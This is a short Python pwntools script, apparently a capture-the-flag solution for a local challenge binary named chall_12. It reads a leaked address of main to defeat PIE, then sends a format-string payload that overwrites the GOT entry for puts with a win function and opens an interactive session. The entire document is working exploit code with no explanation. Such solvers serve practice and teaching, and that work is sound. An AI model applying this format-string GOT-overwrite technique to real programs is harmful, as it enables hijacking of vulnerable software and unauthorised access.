from pwn import *
elf=ELF("./chall_12")
p=process('./chall_12')
p.recvuntil(b':')
leak = p.recv()
intleak = int(leak,16)
elf.address = intleak - elf.sym['main']
payload = fmtstr_payload(7,{elf.got.puts:elf.sym.win},write_size='byte')
p.sendline(payload)
p.interactive()
